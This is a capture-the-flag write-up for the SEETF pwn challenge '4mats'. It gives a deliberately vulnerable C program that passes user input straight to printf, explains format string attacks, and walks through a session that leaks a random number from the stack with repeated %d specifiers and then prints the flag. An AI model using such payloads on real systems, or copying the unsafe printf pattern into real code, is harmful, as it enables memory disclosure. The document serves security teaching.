# 🧑‍🎓 4mats

**Category**: Pwn

100 points | 133 solves

----

## Challenge Description

Lets get to know each other

`nc [ip]`

For beginners:

* [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

## Attached files

* vuln
* vuln.c

### vuln.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char name[16];
char echo[100];
int number;
int guess;
int set = 0;
char format[64] = {0};

void guess_me(int fav_num) {
    printf("Guess my favourite number!\n");
    scanf("%d", &guess);
    if (guess == fav_num) {
        printf("Yes! You know me so well!\n");
        system("cat flag");
        exit(0);
    } else {
        printf("Not even close!\n");
    }
}

int main() {
mat1:
    printf("Welcome to SEETF!\n");
    printf("Please enter your name to register: %s\n", name);
    read(0, name, 16);

    printf("Welcome: %s\n", name);

    while (1) {
mat2:
        printf("Let's get to know each other!\n");
        printf("1. Do you know me?\n");
        printf("2. Do I know you?\n");

mat3:
        scanf("%d", &number);

        switch (number)
        {
            case 1:
                srand(time(NULL));
                int fav_num = rand() % 1000000;
                set += 1;
mat4:
            guess_me(fav_num);
            break;

            case 2:
mat5:
                printf("Whats your favourite format of CTFs?\n");
                read(0, format, 64);
                printf("Same! I love \n");
                printf(format);
                printf("too!\n");
                break;

            default:
                printf("I print instructions 4 what\n");
                if (set == 1)
mat6:
                    goto mat1;
                else if (set == 2)
                    goto mat2;
                else if (set == 3)
mat7:
                    goto mat3;
                else if (set == 4)
                    goto mat4;
                else if (set == 5)
                    goto mat5;
                else if (set == 6)
                    goto mat6;
                else if (set == 7)
                    goto mat7;
                break;
        }
    }
}
```

----

## Solution

### Format string attack

In C/C++, `printf()` can print strings. These strings can contain [format specifiers](https://cplusplus.com/reference/cstdio/printf/) to allow embedding of various types of data. For example:

```c
printf("Some numbers: %d, %d", 123, 4567);
```

This would print out `Some numbers: 123, 4567`. Each `%d` represents a decimal integer, and is replaced by one of the subsequent parameters/values.

If raw user input is passed to the function, `printf` tries to replace any format specifiers in the input with values. If not enough other parameters are passed to the function, it replaces the rest with the first values from the stack (the program's memory) that it can find.

We can use this to read various values on the stack. For example, the below statement would print the hexadecimal representation (`%x`) of the first 12 values of the stack, separated by `.`:

```c
printf("%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x");
```

### Pwning the program

By reading the source code `vuln.c`, we can understand how the program `vuln` works:

1. When run, the program first asks the user to input their name.

2. After that, the program prompts the user to choose between 2 options:

    * Option 1: Ask the user to guess its favourite number. This generates a random number each time for the user to guess, and increases a counter variable, `set`, by 1. If the user guesses correctly, the flag is output.

    * Option 2: Ask the user to input their favourite CTF category. This prints the user's input directly.

    * Other inputs: Execute `goto` statements to the various goto labels `mat1`-`mat7`, corresponding to the current value of `set`.

    This part is repeated in an infinite loop.

In flowchart form:

![Flowchart of program](https://user-images.githubusercontent.com/40383042/173206484-37d35308-7d7f-4636-a10c-0042e574ceca.png)

To get the flag, we have to access the randomly generated number somehow so that we can give the correct answer.

One of the `printf` statements in Option 2 directly takes in raw user input, making it vulnerable to a format string exploit.

```c
...
                printf("Same! I love \n");
                printf(format);  // <------------ this one
                printf("too!\n");
...
```

By running Option 1 first (to generate the random number), then using a format string exploit in option 2, we can read the values in the stack, including the generated number.

```text
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
3
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?
%d %d %d %d %d %d %d %d %d %d
Same! I love 
134520960 64 134514518 1 -6254908 -6254900 562819 -135281700 -6255056 0
too!
```

In this case, the input was `%d %d %d %d %d %d %d %d %d %d`, which will cause it to print the first 10 values from the stack in decimal integer form. This form is convenient because we can directly copy and paste the number.

After trying this a few times, we can infer that the generated number is likely to be the 7th number printed, since the other values remain mostly constant. We now know how to find the correct answer.

However, it generates a new number each time Option 1 is chosen. To bypass this, we have to use one of the `goto` statements to skip to the guessing part so it does not change the number. `goto mat4` would accomplish this, and hence we need to make `set` have a value of 4.

Putting all this together allows us to get the flag. (This is all done in 1 session, but I have split it up for explanatory purposes.)

Firstly, we start the program:

```text
$ nc [ip]
Welcome to SEETF!
Please enter your name to register: 
heehoo
Welcome: heehoo
```

Then, we increment `set` 4 times by selecting Option 1 4 times so that `set == 4`:

```text
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
2
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
2
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
3
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
4
Not even close!
```

Next, we select Option 2 and use a format string attack to print the first few values from the stack as decimal integers (`%d`). The random number from Option 1 is the 7th number printed, `83798`:

```text
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?
%d %d %d %d %d %d %d %d %d %d
Same! I love 
134520960 64 134514518 1 -6254908 -6254900 83798 -135281700 -6255056 0
too!
```

Finally, we skip to the guessing part (`mat4`) by choosing an unknown option, then input the correct answer to get the flag:

```text
Let's get to know each other!
1. Do you know me?
2. Do I know you?
3
I print instructions 4 what
Guess my favourite number!
83798
Yes! You know me so well!
SEE{4_f0r_4_f0rm4t5_0ebdc2b23c751d965866afe115f309ef}
```

### Flag

```text
SEE{4_f0r_4_f0rm4t5_0ebdc2b23c751d965866afe115f309ef}
```
